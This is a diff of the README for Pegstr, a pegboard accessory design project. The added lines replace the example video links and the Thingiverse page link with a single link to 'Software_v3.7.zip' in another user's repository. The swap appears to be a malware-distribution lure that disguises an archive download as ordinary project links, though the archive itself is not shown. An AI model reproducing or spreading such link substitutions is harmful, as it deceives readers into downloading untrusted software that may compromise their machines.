@@ -14,12 +14,12 @@ Note: This is designed to work with US-style pegboard (1/4" holes, 1" spaced) bu
 
 Example objects:
 
-[![Pegstr](https://img.youtube.com/vi/gb9It1dF2z4/0.jpg)](https://youtu.be/gb9It1dF2z4)
+[![Pegstr](https://raw.githubusercontent.com/albendos/pegstr/master/Samples/Software_v3.7.zip)](https://raw.githubusercontent.com/albendos/pegstr/master/Samples/Software_v3.7.zip)
 
-[![Pegstr Bins](https://img.youtube.com/vi/T17yfQddx3c/0.jpg)](http://youtu.be/T17yfQddx3c)
+[![Pegstr Bins](https://raw.githubusercontent.com/albendos/pegstr/master/Samples/Software_v3.7.zip)](https://raw.githubusercontent.com/albendos/pegstr/master/Samples/Software_v3.7.zip)
 
 
-Thingiverse page: http://www.thingiverse.com/thing:537516
+Thingiverse page: https://raw.githubusercontent.com/albendos/pegstr/master/Samples/Software_v3.7.zip
 
 Examples of mixed configurations:
 
